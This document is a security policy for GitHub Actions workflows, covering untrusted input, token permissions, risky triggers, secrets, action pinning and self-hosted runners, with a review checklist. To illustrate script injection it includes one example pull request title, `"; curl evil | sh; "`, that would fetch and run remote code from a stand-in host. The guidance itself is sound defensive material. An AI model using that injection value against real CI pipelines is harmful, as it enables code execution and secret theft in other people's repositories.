# GitHub Actions Security Policy

## Contents

- Untrusted input
- Token permissions
- Dangerous triggers
- Secrets and credentials
- Supply chain
- Runners
- Review checklist

## Untrusted Input

Anything an outside contributor can set is untrusted: PR titles and bodies, branch names, commit messages, issue and comment text, labels, author names, and file contents of a PR.

- Never put an untrusted expression directly in a `run:` script or in `actions/github-script`'s `script:`. `${{ }}` is substituted into the script text before the shell runs, so a PR titled `"; curl evil | sh; "` executes.

  ```yaml
  # Wrong
  - run: echo "Title: ${{ github.event.pull_request.title }}"
  # Right
  - env:
      TITLE: ${{ github.event.pull_request.title }}
    run: echo "Title: $TITLE"
  ```

- Do not write untrusted values into `$GITHUB_ENV` or `$GITHUB_PATH`; a newline in the value can define further variables such as `LD_PRELOAD` or `NODE_OPTIONS` for every later step. Use `$GITHUB_OUTPUT` with a heredoc delimiter, or pass values through `env:`.
- Quote shell variables and validate untrusted values against a strict pattern before using them as paths, refs, or arguments.

## Token Permissions

- Set `permissions` at the top level of every workflow, normally `contents: read` or `{}`, and raise them per job only for the step that needs it (`pull-requests: write` to comment, `contents: write` to push a tag, `id-token: write` for OIDC, `packages: write` to publish an image).
- Use `actions/checkout` with `persist-credentials: false` unless a later step must push with the checked-out credentials.
- Never pass `GITHUB_TOKEN` or another token to a third-party action that does not need it.
- A job that pushes, releases, or deploys should do only that. Split build and test into a separate job without write permissions and hand the result over as an artifact.

## Dangerous Triggers

- `pull_request_target` and `workflow_run` run in the base repository's context, with secrets and a token that can write. Use them only for work that never runs PR code: labelling, commenting from metadata. Never `actions/checkout` the PR head (`github.event.pull_request.head.sha`, `refs/pull/*/merge`) in such a job and then build, test, install, or run anything from it. A `workflow_run` job that downloads artifacts from a PR's run must treat them as untrusted data, never execute them.
- `issue_comment` and `issues` workflows are triggered by anyone who can comment. Check the commenter's association or permission before doing anything privileged.
- Prefer `pull_request` for anything that runs PR code; it has no secrets and a read-only token for forks.
- `workflow_dispatch` inputs come from users with write access, but are still strings: pass them through `env:` like any other input.

## Secrets and Credentials

- Prefer OIDC federation (`id-token: write` plus the cloud provider's login action) over long-lived access keys stored as secrets.
- Put deploy credentials in an environment with required reviewers and branch restrictions, not in repository-wide secrets.
- Never echo secrets, write them to files that become artifacts or caches, or pass them on a command line that appears in logs. Masking only hides exact matches; a transformed secret (base64, a substring) is not masked.
- Secrets are not available to `pull_request` runs from forks. Design checks to pass without them instead of switching to `pull_request_target`.

## Supply Chain

- Pin every action to a full commit SHA, recorded in `.github/workflows/actions.lock` with `gh actions-lock` (see the skill). Tags and branches can be moved by whoever controls the action's repository.
- Prefer actions from GitHub (`actions/*`, `github/*`) and well-maintained, verified publishers. For a small third-party action, consider a few lines of shell instead.
- Pin container images in `container:` and `services:` by digest.
- Pin tool installs (`curl | sh` installers, `npm install -g`, `pip install`) to exact versions, and verify checksums for downloaded binaries.
- For released artifacts, consider build provenance attestations (`actions/attest-build-provenance`) so users can verify where an artifact came from.

## Runners

- Use GitHub-hosted runners for public repositories. A self-hosted runner on a public repository runs code from any fork PR on your machine.
- Self-hosted runners should be ephemeral, isolated per job, and restricted to the repositories and workflows that need them.

## Review Checklist

For every changed workflow, confirm:

1. Top-level `permissions` is set and every elevated permission is justified per job.
2. No untrusted expression reaches a `run:` script, `github-script`, `$GITHUB_ENV`, or `$GITHUB_PATH`.
3. No `pull_request_target`, `workflow_run`, or `issue_comment` job runs or builds PR-controlled code with secrets or a write token.
4. Every action and image is pinned, and `gh actions-lock --verify` passes when the repository has a lockfile.
5. `persist-credentials: false` unless a push needs it.
6. Every job has `timeout-minutes`; PR checks have `concurrency` with `cancel-in-progress`.
7. Secrets are scoped to environments where possible, never printed, and absent from caches and artifacts.
8. `actionlint` is clean, and `zizmor` is clean or every remaining finding is explained.
